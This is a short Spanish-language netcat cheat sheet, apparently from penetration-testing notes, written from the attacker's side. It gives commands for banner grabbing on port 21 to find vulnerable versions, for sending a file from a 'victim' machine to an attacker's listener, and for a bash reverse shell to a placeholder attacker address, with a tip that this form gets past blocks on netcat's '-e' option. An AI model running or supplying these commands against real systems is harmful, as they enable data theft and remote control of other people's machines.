## 🔹 2.1 Banner grabbing manual

nc target 21

👉 Puedes identificar versiones vulnerables manualmente.

---

## 🔹 2.2 Transferencia de archivos

### En atacante:

nc -lvnp 4444 > file.txt

### En víctima:

nc attacker_ip 4444 < file.txt

---

## 🔹 2.3 Reverse shell más estable

bash -i >& /dev/tcp/attacker_ip/4444 0>&1

👉 Mejor que `-e` (a veces bloqueado).